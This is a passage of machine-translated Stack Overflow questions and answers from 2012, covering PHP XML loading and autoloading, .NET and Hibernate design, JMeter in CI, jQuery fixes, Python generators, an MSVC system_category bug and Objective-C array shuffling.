} 
```

}

我在终端中得到的错误如下：

PHP 警告：simplexml_load_file()：I/O 警告：无法在第 47 行的 /Users/msavoy/Sites/TestScripts/xmlFileLoader.php 中加载外部实体“sfly-6x8.000020513524-7001536_28935-tb.33.xml”

警告：simplexml_load_file()：I/O 警告：无法在第 47 行的 /Users/msavoy/Sites/TestScripts/xmlFileLoader.php 中加载外部实体“sfly-6x8.000020513524-7001536_28935-tb.33.xml”

当我对 $xmlFile 执行 var_dump 时，我得到了正确的文件名：sfly-6x8.000020513524-7001536_28935-tb.33.xml

所以我不确定问题是什么。再次感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:57:57.987

问题是我需要在 simplexml_load_file($xmlFile) 方法中定义完整路径。我只好继续寻找。

对不起。

不管怎么说，还是要谢谢你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:33:11.430

编辑你的 php.ini 文件，可能这个方法被禁用了。记住 simplexml_load_file() 只在 PHP 5 中工作。

# php - PHP OOP 架构问题

> ID：12646151
> 
> 赞同：1
> 
> 时间：2012-09-28T19:25:46.340
> 
> 标签：php, oop, architecture

这个问题对某些人来说可能很明显，但我才刚刚开始接触 Web 应用程序的多层架构的表面，尤其是 PHP。我有一个包含多个对象的库，并且它正在迅速扩展。我总是尝试从可重用性的角度来思考，并将我的项目分解成小的、可重用的、松散耦合的组件，这样我不仅要创建项目，还要为未来的项目创建部分。我正在尝试设计一种包管理系统，以便我可以停止在包含对象的语句中使用绝对路径。我想有一个包含我的库中每个类文件的文件。除了包含，我想添加一个带有“单例”的类 模式将允许我按需获取库中每个对象的实例。我计划为每个返回对新实例的引用的对象创建一个静态 getter。基本上，像这样的东西......

```
include('classa.php');
include('classb.php');
include('classc.php');
class pacman{
     private static $instance_stack;
     public static function GetPackage($strPackage){
         if(!self::$instance_stack){
             self::$instance_stack['classa']=new ClassA();
             self::$instance_stack['classb']=new ClassB();
             self::$instance_stack['classc']=new ClassC();
         }
         if(array_key_exists(strtolower($strPackage),self::$instance_stack)){
             return self::$instance_stack[strtolower($strPackage)];
         }
         else{
             return false;
         }
     }

} 
```

那么如果我想上a课...

```
include('pacman.php');
$ClassA = pacman::GetPackage('classa'); 
```

我意识到这是一个非常基本的实现。我的示例仅涵盖最低限度。我的问题不是实现这个；相反，问题在于包含的数百个未实例化的类是否会对性能产生显着影响。如果是这样，有人知道解决方法吗？我无法告诉您跟踪数百个按内容分类为导向器的类的相对路径有多么困难。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:39:02.200

您应该尝试自动加载它们：

```
<?php
function __autoload($class_name) {
    include $class_name . '.php';
}

$obj  = new ClassA();
$obj2 = new ClassB(); 
?> 
```

这会“按需”加载类，从而减少开销并且需要预先包含所有文件。更多信息在这里： http: [//php.net/autoload](http://php.net/autoload)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:38:26.653

对你的表现问题的回答是——没关系。在您拥有 Facebook2、Yahoo2 或 Googl2 之前，您不会注意到任何区别。

我个人不鼓励您广泛使用单音。这是一个具有好名字的 GLOBAL。使您的代码难以长期使用。

如果您对可重用包/库感兴趣，请了解[Phar](http://uk3.php.net/manual/en/book.phar.php)。

如果你到处都需要一个静态 getter，请检查最新的 5.4.x 特性，称为[traits](http://php.net/manual/en/language.oop5.traits.php)。它将帮助您避免代码重复。

最后，不要对您的课程使用 require 。使用[自动加载](http://uk3.php.net/manual/en/function.autoload.php)。

# .net - 进行资源密集型设置的类的正确设计

> ID：12646152
> 
> 赞同：0
> 
> 时间：2012-09-28T19:25:48.250
> 
> 标签：.net, oop

我有一个执行资源密集型调用来填充其数据的类。标准的东西。这是一个简化版...

```
public class Foo1 {
    private bool _IsLoaded;
    private string _Prop;
    private string _Prop2;

    public string Prop1 {
        get {
            ResourceIntensiveCall();
            return _Prop1;
        }
    }

    public string Prop2 {
        get {
            ResourceIntensiveCall();
            return _Prop2;
        }
    }

    private void ResourceIntensiveCall() {
        if ((!_IsLoaded)) {
            // Do processing...
            _IsLoaded = true;
        }
        _Prop1 = "something";
        _Prop2 = "stuff";
    }
} 
```

这很好用，但违反了 Microsoft.Design 规则 UsePropertiesWhereAppropriate，因为该属性做了太多工作（尽管是间接的）。

我可以将调用移至构造函数，但这违反了在构造函数中做太多工作的规则。

我可以使用函数来代替属性，但是如果你有很多函数，这会感觉很麻烦。无论如何，只有第一个客户调用才能真正发挥作用。

我可以使用客户端代码在访问任何属性之前必须调用的 Public Init() 方法，但这是一个设计禁忌，因为它使类太脆弱。

我考虑使用 Foo1Factory 来新建 Foo1 对象并标记 Foo1 构造函数 Internal 以防止世界绕过我的工厂。

对于这种情况，什么被认为是合适的设计？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:28:55.943

> 我可以将调用移至构造函数，但这违反了在构造函数中做太多工作的规则。
> 
> 无论如何，只有第一个客户调用才能真正发挥作用。

看到您似乎只需要对每个实例进行一次调用*（*我的假设 - 整个过程可能是一次），我会在构造函数中这样做，因为其他选项更糟。

属性或方法中的重复代码违反了 DRY，并且`Init`方法可能会让人忘记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T21:47:51.240

我最终做的是将我的属性提取到 DataTransferObject 中：

```
public class Foo1Return {
    public string Prop1 { get; set; }
    public string Prop2 { get; set; }
} 
```

Foo1 只是​​有一个进行计算并返回 DTO 的方法：

```
public class Foo1 {
    public Foo1Return GetFoo1Results() {
        // Do processing...
        Foo1Return output = new Foo1Return();
        output.Prop1 = "something";
        output.Prop2 = "stuff";
        return output;
    }
} 
```

示例客户端代码：

```
Foo1 obj = new Foo1();
Foo1Results results = obj.GetFoo1Results(); 
```

# performance - 通过分布式 jmeter 实例和竹子进行性能测试

> ID：12646153
> 
> 赞同：0
> 
> 时间：2012-09-28T19:25:57.017
> 
> 标签：performance, testing, maven, jmeter, bamboo

我正在为亚马逊网络中运行的几项服务进行性能测试。

我们的架构是：

*   在我们的设施中运行的持续集成服务器（Bamboo）；
*   与要测试的服务在同一网络中的 Jmeter 服务器实例；
*   连接到我们设施中的 JMeter 服务器（ssh 隧道）的 Jmeter 客户端。

我想从竹子开始执行测试，并在上面看到不同的结果。

```
Bamboo with    <--------->   Jmeter server <-------->  WebService
Jmeter client                  on Amazon                on Amazon 
```

有没有人尝试过这样的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T01:29:08.437

通常，将 JMeter 客户端和服务器保持在同一子网中而不使用隧道会更好、更容易。更好，因为您在传输结果数据时不会引入延迟问题，并且更容易，因为隧道 RMI 并不好玩。

我想最简单的解决方案是告诉 Bamboo 执行一个 shell 脚本，然后使用这个脚本来控制开始测试和管理结果。如果您有一个安装了 JMeter 的 ec2 主机，那么您可以使用 ssh 执行测试。类似的东西（为简洁起见）：

```
ssh -i /mykey.pem root@myec2host.com ./path/to/jmeter -n -t /path/to/mytest.jmx -l /my/results.jtl 
```

对于不久前的一个需求，我采用了类似的方法，它发展成为[这个](https://github.com/oliverlloyd/jmeter-ec2). 可能超出您的需求，但如果有任何用处，请随时将其拆开。

就在竹子中看到结果而言，这将是一个定制过程。JMeter 将为每个单独的测试提供一个 csv 或 xml 文件，您可以使用它的 GUI 阅读和可视化这些文件，但对于 CI，您将受益于一个解决方案，该解决方案可以在多个测试运行（即代码的多个构建）中趋势结果。为此，您需要将结果放在某种形式的存储中，可能是数据库，然后查询它们以获得最有用的表示。

如果您只对简单的平均值感兴趣，那么这实际上很容易。只需在测试完成时使用 shell 脚本来 awk 数据，以获取一些汇总值并将它们通过管道传输到表中。或者，这可能更容易，看看 Bamboo API 提供了什么。您可能会发现可以直接导入每个构建的结果，然后使用 Bamboo 工具查看结果。这完全取决于您需要什么级别的报告。

# spring - 使用 Hibernate 的 SPRING JSP 表单

> ID：12646156
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:18.433
> 
> 标签：spring, hibernate, jsp

我有一个问题要问。尝试将新属性保存到数据库中时出现此错误。列“property_id”不能为空。尝试将要素列表保存到数据库时发生异常。由于某种原因，插入的属性与特征之间没有关系。Property_id 在对象 PropertyFeature 中不存在。

这是我的数据：

```
table 'property':

id
name

table 'features'

id
title
property_id [not null] 
```

实体属性

```
 @Table(name = "property")
public class Property extends...{

    @Column(name = "name", nullable = true)
    private String name;    

    @OneToMany(mappedBy = "property", fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    private Set<PropertyFeature> features;  

    public Property() {
    }

    public Property(long id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }   

    public Set<PropertyFeature> getFeatures() {
        return features;
    }

    public void setFeatures(Set<PropertyFeature> features) {
        this.features = features;
    }   

} 
```

实体属性特征

```
@Entity
@Table(name = "property_feature")
public class PropertyFeature extends ... {

    @Column(name = "title", nullable = false)
    private String title;

    @ManyToOne(optional = false, fetch = FetchType.LAZY)
    private Property property;

    public PropertyFeature() {

    }

    public PropertyFeature(String title) {
        this.title = title;
    }   

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }   

    public Property getProperty() {
        return property;
    }

    public void setProperty(Property property) {
        this.property = property;
    }
} 
```

弹簧控制器

```
@Controller
@RequestMapping(value="/account")
public class AccountController {

    @Autowired
    PropertyServiceImpl propertyServiceImpl;

    @RequestMapping(method = RequestMethod.GET, value = "/test")
    public String accountPage(HttpServletRequest request, HttpServletResponse response, ModelMap model) {       

        Property property = propertyServiceImpl.load(12L);

        ArrayList<PropertyFeature> test = new ArrayList<PropertyFeature>();
        test.add(new PropertyFeature("Feature 1"));
        test.add(new PropertyFeature("Feature 2"));
        test.add(new PropertyFeature("Feature 3"));

        model.put("property", property);
        model.put("testList", test);

        return "/test";
    }   

    @RequestMapping(method = RequestMethod.POST, value = "/test")
    public String accountPost(HttpServletRequest request, HttpServletResponse response, Property property) {        

        propertyServiceImpl.update(property);       

        return "/test";
    }   

} 
```

JSP 格式：

```
<form:form method="post" commandName="property">

Name <form:input path="name" type="text" name="name" value="" />
Features
<form:select multiple="true" path="features">
    <form:options items="${testList}" itemValue="title" itemLabel="title"/>
</form:select>

<input type="submit" name="submit" value="Test" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:41:43.120

Hibernate 需要 property_feature 上的外键来连接回`ManyToOne`映射的属性。您没有通过使用提供一列，`@JoinColumn`因此 Hibernate 使用其默认机制在您的模式中创建了一个列。这在第 2.2.5.3.1.4 节中[进行](http://docs.jboss.org/hibernate/annotations/3.5/reference/en/html_single/#entity-mapping-association)了描述。

您已将 Property 映射为非可选的，因此 Hibernate 期望您始终在保存之前设置`Property`a `PropertyFeature`。您已将 添加`PropertyFeature`到 Property 的列表中，但尚未设置`Property`on `PropertyFeature`。

我建议在您的属性类上添加一个方法，如下所示：

```
public void addFeature(PropertyFeature feature) {
  feature.setProperty(this);
  features.add(feature);
} 
```

然后在你的控制器中你可以写：

```
Property property = propertyServiceImpl.load(12L);
property.addFeature(new PropertyFeature("Feature 1")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:06:19.187

我看到了问题所在。为了使它成为我想要的方式，我需要第三个表来连接属性和功能。在这种情况下，我可以指定

```
@JoinTable(name="property_features", joinColumns={@JoinColumn(name="property_id")}, inverseJoinColumns={@JoinColumn(name="id")}) 
```

在这种情况下，休眠创建第三个表，我不必将对象属性设置为每个 PropertyFeature 实例。这很好，但在这种情况下我不喜欢第三张桌子。

我想我会将我的 Property 实体方法 setFeatures 更新为类似的东西

```
public void setFeatures(Set<PropertyFeature> features) {
        for(PropertyFeature pf : features)
            pf.setProperty(this);
        this.features = features;
    } 
```

经测试，按预期工作。如果有更好的方法只用两张桌子来处理它，请告诉我。谢谢

# jquery - jquery动态类

> ID：12646159
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:21.473
> 
> 标签：jquery

我想使用 jquery 将基于预定义变量的类添加到特定的 id 元素。这是我迄今为止尝试过的，但它不起作用。任何帮助都将不胜感激。

这是我的 HTML：

```
<div id="test">THIS TEXT SHOULD BE RED</div> 
```

这是我的 JQUERY

```
$(document).ready(function(){
  var color = "red";
  $("#test").addClass(color);
}; 
```

这是我的 CSS

```
.red {
  color:red;
} 
```

[在codepen上查看](http://codepen.io/anon/pen/dhKgL)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:28:42.870

[当您修复 document.ready 调用时，它工作得很好。](http://jsfiddle.net/wZyfP/)

```
$(document).ready(function () {
    ..code..
}); //you forgot your closing paren here 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:29:19.283

将其更改为

```
$(document).ready(function(){
  var color = "red";
  $("#test").addClass(color);
});​ 
```

您错过了`")"`文档末尾的`ready`。

# javascript - jquery触发第二次点击问题

> ID：12646160
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:23.277
> 
> 标签：javascript, jquery, css, jquery-selectors

我在[这里](http://tst.eclipsecreative.ca/hobson/)使用 CSS 和 JS 为按钮设置动画，目标是当您单击“欢迎”时，按钮会淡化为“关闭”，但一旦您再次单击，我需要它淡化回欢迎。

[这是我当前代码的一个 jsfiddle，正如您在实时链接](http://tst.eclipsecreative.ca/hobson/)上看到的那样[（仅一步）](http://jsfiddle.net/ePBVF/2/)

[这是一个修改版本的 jsfiddle，我试图让它通过第二次点击来工作](http://jsfiddle.net/ePBVF/4/)

提前致谢！或者，如果有人有其他（更简单的方法），请填写我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:45:08.813

```
$("#welcomebtn").click(function() {
  $("#welcomebtn img.top").toggleClass("transparent");
  return false;
}); 
```

当灯箱关闭时，您可以执行此操作以将按钮切换回来：

```
$(".jquery-lightbox-overlay").click(function(){
    $("#welcomebtn img.top").toggleClass("transparent");
}); 
```

但请注意，用户可以单击任意位置来关闭灯箱。

# eclipse - 转换为 Maven 后，Eclipse Web 项目无法正常工作

> ID：12646161
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:37.753
> 
> 标签：eclipse, maven

在我将它转换为 Maven 项目之前，我有一个运行良好的 Eclipse Web 项目。以前，我可以对 servlet 进行更改，从 Eclipse Servers 选项卡重新启动 Tomcat，然后浏览到我的 localhost 以查看该页面。我对 JSP 文件所做的任何更改都会在页面重新加载时立即反映出来。

转换为 Maven 项目后，当我对 Java 文件进行更改时，即使我选择了自动生成，build 目录下的 .class 文件也不会更新。如果我删除 .class 文件，它不会被重建。如果我尝试在浏览器中查看 webapp，我会看到 servlet 类的 ClassNotFoundException。

我花了很多时间浏览项目的属性并在线搜索，但我不知道如何让它再次工作。任何帮助表示赞赏。

更新：我通过将源文件从 project_root/src 移动到 src/main/java 解决了部分问题。现在我可以使用 Maven 构建项目，但我仍然需要手动将类文件复制到本地 tomcat 的 webapp 目录。如果有人知道自动化的方法，我想听听。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-21T12:50:22.160

You might have incorrect output folder for generated java classes in your java build path. it should be yourprojectname/target/buildfoldername/WEB-INF/classes. Select your project->Properties->java build path->source->change the output folder the src/main/java to the above path.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T16:25:06.270

我通过将源文件从 project_root/src 移动到 src/main/java 来解决这个问题，然后确保 src/main/java 位于 Project > Properties > Java Build Path > Source 选项卡下的构建路径上。Eclipse 现在将我更改的文件部署到 .metadata 下的正确目录，以便更改显示在我的本地 Tomcat 实例中。@davidfmatheson，感谢您的评论，我将研究使用 m2e-wtp。

# python - 在子循环中产生/返回主要项目的 Pythonic 方式

> ID：12646162
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:44.060
> 
> 标签：python, for-loop, generator

我有两个不同的对象。其中一个在列表或元组属性中包装了 N 个其他类型的对象。假设教室里的学生：

```
class Student:
    def __init__(self, name):
        self.name = name

class ClassRoom:
    def __init__(self, students):
        self.students = students 
```

当然，我们有大量 Student 和 ClassRoom 实例：

```
john, sam = Student('John'), Student('Sam')
patrick, michael, bill = Student('Patrick'), Student('Michael'), Student('Bill')
klass1 = ClassRoom([john, sam])
klass2 = ClassRoom([patrick, michael, bill]) 
```

只需考虑每个学生的名字都是独一无二的，并且您无法通过引用访问学生的教室，如下所示：

```
sam.get_classroom() # Student class doesn't support this :( 
```

我们有一个辅助函数来完成这项工作：

```
def get_classroom_by_student(klasses, student_name):
    for klass in klasses:
        for student in klass.students:
            if student.name==student_name:
                return klass
                # Or yield if a student belongs to more than one class

sams_class = get_classroom_by_student([klass1, klass2], 'Sam')
bills_class = get_classroom_by_student([klass1, klass2], 'Bill') 
```

既然“平面优于嵌套”，我该如何创建一个高效的生成器，或者是否有一些 Python 的方法来实现这个辅助函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:40:49.760

假设您不想更改数据模型，您可以像这样重写您的函数：

```
def get_classroom_by_student(klasses, student_name):
    for klass in klasses:
        for student in klass.students:
            if student.name==student_name:
                yield klass 
```

这或多或少等同于

```
def get_classroom_by_student(klasses, student_name):
    combinations = []
    for klass in klasses:
        for student in klass.students:
            if student.name==student_name:
                combinations.append(klass)
    return combinations 
```

但是，清洁剂如下：

```
def get_classroom_by_student(klasses, student):
    for klass in klasses:
        for s in klass.students:
            if s is student:
                yield klass 
```

这可以使用嵌套列表推导重写：

```
def get_classroom_by_student(klasses, student):
    return [klass for klass in klasses for s in klass.students if s is student] 
```

甚至更短

```
def get_classroom_by_student(klasses, student):
    return [klass for klass in klasses if student in klass.students] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:50:41.197

这个怎么样：

```
class Student:
    def __init__(self, name):
        self.name = name

class ClassRoom:
    def __init__(self, students):
        self.students = students

john, sam = Student('John'), Student('Sam')
patrick, michael, bill = Student('Patrick'), Student('Michael'), Student('Bill')

klass1 = ClassRoom([john, sam])
klass2 = ClassRoom([patrick, michael, bill])

def where_is(student, klasses):
    return next((x for x in klasses if student in x.students), None)

assert klass1 is where_is(john, [klass1, klass2])
assert klass2 is where_is(patrick, [klass1, klass2])

nobody = Student('foo')
assert None is where_is(nobody, [klass1, klass2]) 
```

对于产生的版本，只需省略`next`并返回生成器：

```
def where_is(student, klasses):
    return (x for x in klasses if student in x.students)

for klass in where_is(john, [klass1, klass2]):
    print klass 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T19:55:03.060

所以这没有那么多的嵌套。本质上，我们构建了一个字典 m，将每个学生映射到其教室。在我看来，它不是那么可读或干净。

您可能想构建一次字典，然后使用它来查找学生课程。我强烈建议检查[Django 中的模型](https://docs.djangoproject.com/en/1.4/intro/tutorial01/)。他们以更清洁的方式完成您正在寻找的工作。Django 的优点在于，如果您在教室与学生之间放置外键关系，它会自动向学生对象添加方法，让您查找他们的教室。因此，它为您完成所有工作。

```
from itertools import chain

def flatten(items):
    return list(chain.from_iterable(items))

def get_classroom_by_student(klasses, student_name):
    m = flatten([dict.fromkeys(k.students, k).items() for k in klasses])
    m = dict([(s.name, c) for s,c in m])
    return m[student_name] 
```

# windows-7-x64 - 如何将我的 Windows 7 笔记本电脑变成远程服务器？

> ID：12646164
> 
> 赞同：-1
> 
> 时间：2012-09-28T19:26:47.147
> 
> 标签：windows-7-x64, remote-server

我需要将我的笔记本电脑变成远程服务器。它运行的是 Windows 7。不一定需要完整的解释，只要指出正确的方向就足够了。感谢您的时间！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T19:29:24.880

您可能需要执行以下步骤

*   在路由器上设置端口转发（Web 服务器的端口 80）
*   在笔记本电脑上设置服务器（Apache Web 服务器）
*   使用您的公共 IP 地址或使用[托管 DNS等服务](http://dyn.com/dns/)

# c++ - 在带有 msvc11 的静态类析构函数中使用 std::system_category()

> ID：12646165
> 
> 赞同：3
> 
> 时间：2012-09-28T19:26:50.117
> 
> 标签：c++, c++11, visual-c++, visual-studio-2012, std-system-error

我对 C++ 很陌生，但我想确保在向 Microsoft 报告错误之前我没有做错什么。

这是一些示例代码：

```
#include <system_error>

using namespace std;

class Test
{
public:
    ~Test()
    {
        throw system_error(5, system_category());
    }
};

Test test;

void testfunc()
{
    throw system_error(5, system_category());
}

void main()
{
    try
    {
        testfunc();
    }
    catch ( const system_error& e)
    {
    }
} 
```

现在，我希望 Windows 会说“运行时已请求程序以意外方式退出”。但是，我得到一个“称为纯虚函数”的错误。通过一点调试，我注意到当静态类析构函数获取`std::system_category`引用时，`::name`和`::message`成员是纯虚拟的。但是，当它在 中构造时`testfunc()`，那些 vtable 指针指向有效函数。

`system_error`我的问题是，以这种方式构建异常，我做错了什么吗？我有一些基本上在做的代码`throw system_error(GetLastError(), system_category());`。这恰好在静态析构函数中执行，我得到了一个名为 error 的纯虚函数。

要从 Windows 的`GetLastError()`函数中抛出异常，我应该以不同的方式构建我的异常，还是这是 msvc11 的 C++ 运行时中的错误？

**编辑**

我的问题有点混乱。我的实际代码比这个例子更复杂，我实际上没想到我的析构函数之一会抛出。我的析构函数**必须**调用一个可能抛出的函数。如果我将代码更改为：

```
~Test()
{
    try
    {
        callSomeFuncThatCouldThrow();
    }
    catch ( … ) { }
} 
```

我*仍然*会得到纯虚函数调用错误。这是因为当 system_error 被构造（在 中`callSOmeFuncThatCouldThrow()`）时，它会尝试使用我给它的`::message`成员，这会导致错误。`system_category`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T20:07:09.523

看起来像微软的错误。`std::error_category`是各种未命名类型的抽象基类，其中之一是`system_category()`. 有一个该类型的对象，所有调用都`system_category()`返回对该对象的引用。您所看到的看起来该对象在对象的析构函数`test`运行之前已被销毁。如果您想满足纯粹主义者，请将您的析构函数更改为：

```
Test::~Test() {
    const std::error_category& cat = std::system_category();
    std::cout << cat.name() << '\n';
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-16T22:54:08.680

这是 Visual C++ 标准库实现中的一个错误。全局错误类别对象是使用类模板的静态数据成员实现的。不幸的是，在单个翻译单元（又名源文件）中，这些数据成员将在翻译单元中的所有其他命名空间范围对象*之后初始化，并将在这些对象**之前*被销毁（因为销毁以初始化的相反顺序发生）。

我的建议是避免在初始化和终止期间调用`generic_category()`,`iostream_category()`或`system_category()`（即，在所有静态对象被初始化之前或在静态对象的销毁开始之后）。

如果这不可行，则以下解决方法*可能*有效。它在我运行的几个简单测试中都有效，但我无法保证它在所有情况下的行为（这不是“官方”解决方法；它只是一个潜在的解决方法）。使用以下内容将 .cpp 文件添加到您的项目中：

```
// This is a workaround for a bug in the Visual C++ 2012 implementation of the
// global error category objects--generic_category(), iostream_category(), and
// system_category().
#ifdef _MSC_VER

#if _MSC_VER != 1700
#  error Please verify that this fix is still required and is still correct!
#endif

#include <system_error>

// Ensure that static objects in this translation unit get initialized "first":
#pragma warning(suppress: 4073)
#pragma init_seg(lib)

// Explicitly instantiate the global error objects in this translation unit:
template struct std::_Error_objects<int>;

#endif // _MSC_VER 
```

`#pragma init_seg(lib)`应确保在用户代码中的任何静态对象之前初始化静态数据成员`_Error_objects<int>`。不要在此源文件中添加任何其他内容：`#pragma init_seg`适用于翻译单元中的所有对象。 `_Error_objects`是一个实现细节，并且该实现细节可能随时更改，因此编译器版本检查。

# objective-c - 用从列表中选择的随机字符填充数组，不重复

> ID：12646168
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:55.827
> 
> 标签：objective-c, arrays, char, switch-statement

我正在尝试用 6 个不同字符中的 4 个填充数组，其中数组中的每个字符都不同。放入数组的字符基于 switch 语句。然后我想通过数组返回以确保我刚刚放置的字符不在数组中，如果是，我必须放入不同的字符。我该怎么做呢？我不想重新填充整个阵列，只是这一点。

这是我到目前为止的代码，包括评论：

```
-(void) fillarray{

for (int i=0; i<4; i++)
{
    int randomNum = arc4random() % 6; // generates a random number

          switch (randomNum) // based on the number generated, it choses what color will be placed into the slot
    {
        case 1:
            colorarray[i] ='r';
            break;

        case 2:
            colorarray[i] ='o';
            break;

        case 3:
            colorarray[i] ='y';
            break;

        case 4:
            colorarray[i] ='g';
            break;
        case 5:
            colorarray[i] = 'b';

        case 6:
            colorarray[i] = 'p';

        default:
            break;
    }

    for (int j=0; j<4; j++) // runs through the array to ensure that the recently placed color does not match previous placed colors
    {
        while (j /= i)

            if (colorarray[i]==colorarray[j]) // if the color is already in the array
                                            //try again to place another color in this location

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T01:09:18.650

我会使用这个，基于[Fisher-Yates 洗牌算法](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle#The_.22inside-out.22_algorithm)

```
NSArray * array = @[ @"r", @"o", @"y", @"g", @"b", @"p" ] ;
array = [ [ array shuffledArray ] subarrayWithRange:(NSRange){ .length = 4 } ] ; 
```

在哪里`-shuffledArray`添加到 NSArray 通过：

```
@implementation NSArray ( Shuffling )

-(NSArray*)shuffledArray
{
    NSMutableArray * result = [ NSMutableArray arrayWithCapacity:self.count ] ;
    [ result addObject:self[0] ] ;
    for( NSUInteger index=1, count = self.count; index < count; ++index )
    {
        int j = arc4random_uniform( (unsigned int)index ) ;
        [ result addObject:result[j] ] ;
        [ result replaceObjectAtIndex:j withObject:self[ index ] ] ;
    }

    return result ;
}

@end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:37:16.397

首先，您获取可以提取的所有可能字符的数组（您也可以使用 NSArray，在这里我假设您想使用 C 样式的数组）：

```
char characters[]={'r','o','y','g','b','p'};
int length=6; 
```

然后每次提取一个字符时，都会减小长度变量并将最后一个提取的字符与最后一个交换，以确保它不会再次被使用：

```
int randomNum = arc4random() % length;
< put characters[randomNum] somewhere>
char temp=characters[randomNum];
characters[randomNum]=characters[length-1];
characters[length-1]=temp;
length--; 
```

PS：% 操作数返回商的余数，所以数字 %N 永远不会是 N，它的范围是从 0 到 N-1。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-02T03:25:48.950

这是另一种洗牌数组的方法（获取随机的前 X 个元素）。基本上，你按照 Ramy Alzury 和 nielsbot 的反应去做。算法是这样的。

```
Do this 10 times the length of the array
    swap the last element with a random element chosen from the array 
```

最后，这应该产生一个随机打乱的数组（你正在打乱它 10 次）

这是Objective C中的一个示例函数。

```
-(NSArray *) shuffleArray:(NSArray *) arr{
    NSMutableArray * mArr = [NSMutableArray arrayWithArray:arr];
    for(int i=0;i<arr.count*10;i++){
        int num = arc4random()%arr.count;
        NSString * temp = (NSString *)[mArr objectAtIndex:arr.count-1];
        [mArr replaceObjectAtIndex: arr.count-1 withObject:[mArr objectAtIndex:num]]; 
        [mArr replaceObjectAtIndex:num withObject:temp];
    }
    return [NSArray arrayWithArray:mArr];
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T20:09:52.697

此外，如果您不想使用 switch 或（本质上）通过递减长度变量来删除从数组中接收到的字符，您总是可以这样做：

```
char colorarray[5] = {0,0,0,0,'\0'};
char possibleCharacters[6] = {'r', 'o', 'y', 'g', 'b', 'p'};
BOOL isNotUnique = NO;

for(int i = 0; i < 4; i++){
    do{
        colorarray[i] = possibleCharacters[arc4random() % 6];
        for(int j = i - 1; j > -1; --j){
            if(colorarray[i] == colorarray[j]){
                isNotUnique = YES;
                break;
            }
            else isNotUnique = NO;
        }
    }while(isNotUnique);
}

NSLog(@"%s", colorarray); 
```

获取字符的实际循环基本上是：

```
1    for each spot in the colors arrays
2        generate a random number and use it to get a character
3        check to see if the character is identical to any spot before this one
4        if our new character matched any previous one, repeat from 2 on 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T19:36:56.597

该函数应如下所示：

```
 int found = 1;
    for (int i=0; i<4; i++)
    {
        while(found) {
           int randomNum = arc4random() % 6;
           switch (randomNum) 
           {
              case 1:
                colorarray[i] ='r';
                break;

              case 2:
                colorarray[i] ='o';
                break;

             case 3:
               colorarray[i] ='y';
               break;

             case 4:
               colorarray[i] ='g';
               break;
             case 5:
               colorarray[i] = 'b';
               break;

             case 6:
               colorarray[i] = 'p';

             default:
               break;
           }
           found = 0;
           for (int j = i-1; i >= 0; j--) {
              if (colorarray[i] == colorarray[j])
                 found = 1;
           }
        }
 } 
```

# mysql - 如何将 ruby 连接到 mysql？

> ID：12646170
> 
> 赞同：0
> 
> 时间：2012-09-28T19:26:59.007
> 
> 标签：mysql, ruby-on-rails-3

所以，我是 MacOs 和 Ruby 的新手。我在终端上玩了一点Ruby，到目前为止一切都很好。然后我下载并安装了 rails 框架。一切顺利！但是当我启动服务器时

```
rails server 
```

就在刷新“欢迎登机网站”之后，我在终端中收到了这个错误：

```
Mysql2::Error (Access denied for user 'root'@'localhost' (using password: NO)):
mysql2 (0.3.11) lib/mysql2/client.rb:44:in `connect'
mysql2 (0.3.11) lib/mysql2/client.rb:44:in `initialize' 
```

还有更多的错误行，但我确信它们都与找不到和/或无法连接到 mySql 相关。在安装 rails 以将其与 Apache/PHP 一起使用之前，我已经安装了 mySql 服务器。所以我认为必须有一个文件来说明服务器所在的rails或者告诉rails用户/密码？

我在谷歌上寻找解决方案，但我只是得到了人们因为不同的事情而遇到麻烦的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:31:52.070

**请在config/database.yml**文件中指定 mysql 用户名和密码

例如，对于开发环境：

```
development:
  adapter: mysql2
  encoding: utf8
  database: < your database name>
  username: <your usename>
  password: <your password> 
```

如果需要，您可以添加更多属性，我在这里只显示了必填字段。

谢谢

# java - 表列：仅显示图像

> ID：12646171
> 
> 赞同：0
> 
> 时间：2012-09-28T19:27:04.307
> 
> 标签：java, image, swt

我根据布尔值的状态将图像放在列中。

```
